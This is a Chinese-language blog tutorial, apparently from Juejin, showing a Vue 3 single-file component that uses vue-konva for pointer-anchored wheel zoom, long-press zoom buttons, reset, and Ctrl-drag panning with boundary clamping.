            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2277843825591400/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端卿年
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:55:49.000Z" title="Mon Nov 24 2025 03:55:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">Vue-Konva 使用（缩放 / 还原 / 拖动） 示例（当前示例为vue3版本）</h2>
<h3 data-id="heading-1">目标</h3>
<ul>
<li>在一个 Vue 单文件组件中，完成以下交互：
<ul>
<li>鼠标滚轮相对指针位置缩放（向上放大、向下缩小）</li>
<li>按钮（支持长按）居中放大 / 居中缩小 / 还原</li>
<li>按住 <code>Ctrl + 左键</code> 拖动画布（仅在放大后可拖动）</li>
<li>缩小时居中显示、禁止拖动</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">安装与注册</h3>
<ul>
<li>安装依赖（任选包管理器）：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">npm i vue-konva konva
<span class="hljs-comment"># 或</span>
pnpm add vue-konva konva
</code></pre>
<ul>
<li>注册插件（两种方式）：
<ul>
<li>入口处全局注册：</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.ts</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">VueKonva</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-konva'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>);
<span class="hljs-comment">// 使用 v- 前缀，也可以自定义：{ prefix: 'V' }</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">VueKonva</span>, { <span class="hljs-attr">prefix</span>: <span class="hljs-string">'V'</span> });
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>);
</code></pre>
<ul>
<li>组件内自注册（在组件 <code>setup</code> 阶段注册，确保首帧渲染前完成）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 在组件 setup 阶段注册，避免首次渲染前出现未注册错误</span>
<span class="hljs-keyword">import</span> { getCurrentInstance } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">VueKonva</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-konva'</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">getCurrentInstance</span>()?.<span class="hljs-property">appContext</span>.<span class="hljs-property">app</span>;
app?.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">VueKonva</span>, { <span class="hljs-attr">prefix</span>: <span class="hljs-string">'V'</span> });
</code></pre>
<h3 data-id="heading-3">组件与事件说明</h3>
<ul>
<li><code>VStage</code>：Konva <code>Stage</code> 的 Vue 封装，是画布根容器。
<ul>
<li>事件：<code>@wheel</code>（滚轮缩放）、<code>@mousedown/@mousemove/@mouseup/@mouseleave</code>（平移手势）</li>
</ul>
</li>
<li><code>VLayer</code>：Konva <code>Layer</code> 的 Vue 封装，是真正的 <code>&lt;canvas&gt;</code> 层，可放多个图层。</li>
<li><code>VRect</code> / <code>VText</code> / <code>VImage</code> / <code>VTransformer</code>：Konva 基础与变换组件。</li>
</ul>
<h3 data-id="heading-4">交互设计要点</h3>
<ul>
<li>指针相对缩放：通过记录指针位置 <code>pos</code>，计算缩放前指针对应的画布坐标 <code>mousePointTo</code>，再反算缩放后画布位置，使“缩放围绕指针”发生。</li>
<li>居中缩放按钮：以画布中心为缩放锚点，保证视觉稳定。</li>
<li>边界约束：
<ul>
<li>当 <code>scale &lt;= 1</code>（缩小）时，强制居中显示，禁止平移。</li>
<li>当 <code>scale &gt; 1</code>（放大）时，限制平移在可视范围内，避免出现大面积空白。</li>
</ul>
</li>
<li>Ctrl 拖动：按住 <code>Ctrl + 左键</code> 时，禁用元素交互（不可拖动 / 不响应点击），专注于画布平移。</li>
</ul>
<h3 data-id="heading-5">单文件组件示例（可直接使用）</h3>
<blockquote>
<p>复制到你的项目中即可运行。若已在入口处注册了 <code>VueKonva</code>，组件内注册可删除。</p>
</blockquote>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
import { getCurrentInstance, onMounted, onUnmounted, ref } from 'vue';
import VueKonva from 'vue-konva';

// 组件内自注册 VueKonva（你也可以在应用入口统一注册）
const app = getCurrentInstance()?.appContext.app;
app?.use(VueKonva, { prefix: 'V' });
// 画布尺寸（根据实际需求调整）
const canvasSize = { width: 800, height: 600 };

// VStage 的模板引用，用于获取 Konva Stage 实例
const stageRef = ref&lt;any&gt;(null);

// Ctrl + 左键平移相关状态
const isPanning = ref(false); // 是否正在平移
const panStartPointer = ref&lt;{ x: number, y: number } | null&gt;(null); // 平移起点的指针位置
const panStartStagePos = ref&lt;{ x: number, y: number } | null&gt;(null); // 平移起点的画布位置
const isCtrlPressing = ref(false); // 是否按住了 Ctrl 键（影响元素交互与光标）

// 获取 Konva Stage 实例
function getStage() {
  const node = stageRef.value?.getNode?.();
  return node ?? null;
}

// 连续缩放比例步进（越接近 1 越平滑）
const SCALE_STEP = 1.05;

// 约束画布位置：
// - 缩放 ≤ 1 时，居中显示，不允许漂移
// - 缩放 &gt; 1 时，限制在可视范围内，避免出现空白
function clampStagePosition(stage: any) {
  const s = stage.scaleX();
  if (s &lt;= 1) {
    const cx = stage.width() * (1 - s) / 2;
    const cy = stage.height() * (1 - s) / 2;
    stage.position({ x: cx, y: cy });
    return;
  }
  const maxX = 0;
  const minX = stage.width() * (1 - s);
  const maxY = 0;
  const minY = stage.height() * (1 - s);
  const pos = stage.position();
  const clampedX = Math.min(maxX, Math.max(minX, pos.x));
  const clampedY = Math.min(maxY, Math.max(minY, pos.y));
  stage.position({ x: clampedX, y: clampedY });
}

// 指针相对缩放：保持指针下的内容为缩放中心
// factor &gt; 1 放大；factor &lt; 1 缩小
// doClamp = true（滚轮）：需要边界约束
// doClamp = false（按钮）：不立即约束，但当缩小到 ≤1 时仍需居中
function zoomBy(factor: number, pointer?: { x: number, y: number }, doClamp = true) {
  const stage = getStage();
  if (!stage)
    return;

  const oldScale = stage.scaleX();
  const pos = pointer ?? stage.getPointerPosition() ?? { x: stage.width() / 2, y: stage.height() / 2 };

  // 计算指针相对缩放锚点
  const mousePointTo = {
    x: (pos.x - stage.x()) / oldScale,
    y: (pos.y - stage.y()) / oldScale,
  };

  // 应用缩放
  const newScale = oldScale * factor;
  stage.scale({ x: newScale, y: newScale });

  // 反算缩放后的位置，使缩放相对锚点
  const newPos = {
    x: pos.x - mousePointTo.x * newScale,
    y: pos.y - mousePointTo.y * newScale,
  };
  stage.position(newPos);

  // 边界约束策略
  if (doClamp) {
    clampStagePosition(stage);
  }
  else {
    if (newScale &lt;= 1)
      clampStagePosition(stage);
  }

  stage.batchDraw();
}

// 按钮：从画布中心放大
function zoomIn() {
  const stage = getStage();
  if (!stage)
    return;
  zoomBy(SCALE_STEP, { x: stage.width() / 2, y: stage.height() / 2 }, false);
}

// 按钮：从画布中心缩小
function zoomOut() {
  const stage = getStage();
  if (!stage)
    return;
  zoomBy(1 / SCALE_STEP, { x: stage.width() / 2, y: stage.height() / 2 }, false);
}

// 长按：支持按住按钮持续缩放，短按触发一次
const holdTimeout = ref&lt;number | null&gt;(null);
const holdInterval = ref&lt;number | null&gt;(null);
const holdAction = ref&lt;'in' | 'out' | null&gt;(null);
const HOLD_DELAY_MS = 250;     // 长按判定延迟
const HOLD_INTERVAL_MS = 60;   // 长按时的连续触发间隔

function clearHoldTimers() {
  if (holdTimeout.value) {
    window.clearTimeout(holdTimeout.value);
    holdTimeout.value = null;
  }
  if (holdInterval.value) {
    window.clearInterval(holdInterval.value);
    holdInterval.value = null;
  }
}

function onPressStart(action: 'in' | 'out') {
  clearHoldTimers();
  holdAction.value = action;
  holdTimeout.value = window.setTimeout(() =&gt; {
    holdInterval.value = window.setInterval(() =&gt; {
      if (holdAction.value === 'in')
        zoomIn();
      else
        zoomOut();
    }, HOLD_INTERVAL_MS);
  }, HOLD_DELAY_MS);
}

function onPressEnd() {
  // 短按：尚未进入长按循环时触发一次
  if (holdTimeout.value &amp;&amp; !holdInterval.value &amp;&amp; holdAction.value) {
    if (holdAction.value === 'in')
      zoomIn();
    else
      zoomOut();
  }
  clearHoldTimers();
  holdAction.value = null;
}

// 还原：缩放为 1，位置归位（中心）
function resetZoom() {
  const stage = getStage();
  if (!stage)
    return;
  stage.scale({ x: 1, y: 1 });
  stage.position({ x: 0, y: 0 });
  stage.batchDraw();
}

// 滚轮缩放：向上放大，向下缩小；相对指针的位置
function onWheel(e: any) {
  const stage = getStage();
  if (!stage)
    return;
  e.evt?.preventDefault?.();
  const direction = e.evt?.deltaY &gt; 0 ? (1 / SCALE_STEP) : SCALE_STEP;
  zoomBy(direction, stage.getPointerPosition() ?? undefined);
}

// Ctrl+左键开始平移（仅当缩放 &gt; 1 时有效）
function onStageMouseDown(e: any) {
  const stage = getStage();
  if (!stage)
    return;
  if (e.evt?.ctrlKey &amp;&amp; e.evt?.button === 0) {
    if (stage.scaleX() &lt;= 1)
      return;
    e.evt.preventDefault();
    isPanning.value = true;
    panStartPointer.value = stage.getPointerPosition() ?? null;
    const pos = stage.position();
    panStartStagePos.value = { x: pos.x, y: pos.y };
  }
}

// 平移中：根据起点与当前指针计算偏移，并做边界约束
function onStageMouseMove() {
  if (!isPanning.value)
    return;
  const stage = getStage();
  if (!stage)
    return;
  const pointer = stage.getPointerPosition();
  if (!pointer || !panStartPointer.value || !panStartStagePos.value)
    return;
  const dx = pointer.x - panStartPointer.value.x;
  const dy = pointer.y - panStartPointer.value.y;
  stage.position({ x: panStartStagePos.value.x + dx, y: panStartStagePos.value.y + dy });
  clampStagePosition(stage);
  stage.batchDraw();
}

// 结束平移，重置状态
function onStageMouseUp() {
  isPanning.value = false;
  panStartPointer.value = null;
  panStartStagePos.value = null;
}

// 记录 Ctrl 按键状态，用于切换元素交互与容器鼠标样式
function onKeyDown(e: KeyboardEvent) {
  if (e.key === 'Control')
    isCtrlPressing.value = true;
}
function onKeyUp(e: KeyboardEvent) {
  if (e.key === 'Control')
    isCtrlPressing.value = false;
}

onMounted(() =&gt; {
  window.addEventListener('keydown', onKeyDown);
  window.addEventListener('keyup', onKeyUp);
});
onUnmounted(() =&gt; {
  window.removeEventListener('keydown', onKeyDown);
  window.removeEventListener('keyup', onKeyUp);
  clearHoldTimers();
});

// 示例图形配置（矩形&amp;文字）
// Ctrl 按下时禁用元素交互（不可拖动/不可点击），专注画布平移
const rectConfig = ref({
  x: canvasSize.width / 2 - 100,
  y: canvasSize.height / 2 - 50,
  width: 200,
  height: 100,
  fill: '#80c7ff',
  stroke: '#0ea5e9',
  strokeWidth: 1,
  draggable: true,
});
const textConfig = ref({
  x: canvasSize.width / 2 - 50,
  y: canvasSize.height / 2 + 70,
  text: 'Hello, Konva!',
  fontSize: 18,
  fill: '#334155',
});
&lt;/script&gt;

&lt;template&gt;
  &lt;div class="konva-demo-container" :class="{ 'cursor-pointer': isCtrlPressing }"&gt;
    &lt;!-- 工具栏：居左上角 --&gt;
    &lt;div class="toolbar"&gt;
      &lt;button class="btn btn-outline"
              @mousedown="onPressStart('in')" @mouseup="onPressEnd" @mouseleave="onPressEnd"
              @touchstart.prevent="onPressStart('in')" @touchend="onPressEnd"&gt;
        ＋ 放大
      &lt;/button&gt;
      &lt;button class="btn btn-outline"
              @mousedown="onPressStart('out')" @mouseup="onPressEnd" @mouseleave="onPressEnd"
              @touchstart.prevent="onPressStart('out')" @touchend="onPressEnd"&gt;
        － 缩小
      &lt;/button&gt;
      &lt;button class="btn btn-secondary" @click="resetZoom"&gt;
        ⟳ 还原
      &lt;/button&gt;
      &lt;span class="hint"&gt;按住 Ctrl + 左键可拖动画布（仅放大后可用）&lt;/span&gt;
    &lt;/div&gt;

    &lt;!-- 画布容器（Konva） --&gt;
    &lt;div class="stage-wrapper" :style="{ width: `${canvasSize.width}px`, height: `${canvasSize.height}px` }"&gt;
      &lt;VStage
        ref="stageRef"
        :config="{ width: canvasSize.width, height: canvasSize.height }"
        @wheel="onWheel"
        @mousedown="onStageMouseDown"
        @mousemove="onStageMouseMove"
        @mouseup="onStageMouseUp"
        @mouseleave="onStageMouseUp"
      &gt;
        &lt;VLayer&gt;
          &lt;!-- 示例矩形：Ctrl 时禁用交互 --&gt;
          &lt;VRect :config="{ ...rectConfig, draggable: !isCtrlPressing, listening: !isCtrlPressing }" /&gt;
          &lt;!-- 示例文字（不拖动，仅展示） --&gt;
          &lt;VText :config="textConfig" /&gt;
        &lt;/VLayer&gt;
      &lt;/VStage&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;style scoped&gt;
.konva-demo-container {
  position: relative;
  display: flex;
  align-items: flex-start;
  justify-content: center;
  min-height: 100vh;
  background: linear-gradient(90deg, #f0f0f0 1px, transparent 1px), linear-gradient(#f0f0f0 1px, transparent 1px);
  background-size: 20px 20px;
}

.toolbar {
  position: absolute;
  top: 16px;
  left: 16px;
  display: flex;
  gap: 8px;
  align-items: center;
  z-index: 10;
}

.btn {
  height: 32px;
  padding: 0 12px;
  border-radius: 6px;
  font-size: 13px;
  cursor: pointer;
  user-select: none;
}
.btn-outline {
  border: 1px solid #cbd5e1;
  background: #ffffff;
}
.btn-outline:hover {
  background: #f8fafc;
}
.btn-secondary {
  color: #0f172a;
  background: #e2e8f0;
  border: 1px solid #cbd5e1;
}
.hint {
  font-size: 12px;
  color: #64748b;
  margin-left: 8px;
}

.stage-wrapper {
  margin-top: 64px;
  border-radius: 8px;
  box-shadow: 0 4px 24px rgba(2, 6, 23, 0.08);
  background: #fff;
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-6">常见问题与优化建议</h3>
<ul>
<li>为什么缩小时会“跑左上角”？
<ul>
<li>未做“缩放 ≤ 1 的居中约束”会导致位置归零（左上角）。本文示例通过 <code>clampStagePosition</code> 在缩小时居中。</li>
</ul>
</li>
<li>为什么放大后拖动会被限制？
<ul>
<li>为避免出现空白区域，拖动范围会被限制在内容可视范围内。</li>
</ul>
</li>
<li>如何让按钮也按“指针位置”缩放？
<ul>
<li>将 <code>zoomIn/zoomOut</code> 的第二个参数换成 <code>stage.getPointerPosition()</code> 即可，但习惯上按钮用画布中心更稳定。</li>
</ul>
</li>
<li>光标反馈（增强）：
<ul>
<li>可在 <code>Ctrl</code> 按下时用 <code>cursor: grab</code>，平移过程中用 <code>cursor: grabbing</code> 增强手感。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">参考文档</h3>
<ul>
<li>Konva 官方（Vue）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fkonvajs.org%2Fdocs%2Fvue%2Findex.html" target="_blank" title="https://konvajs.org/docs/vue/index.html" ref="nofollow noopener noreferrer">konvajs.org/docs/vue/in…</a></li>
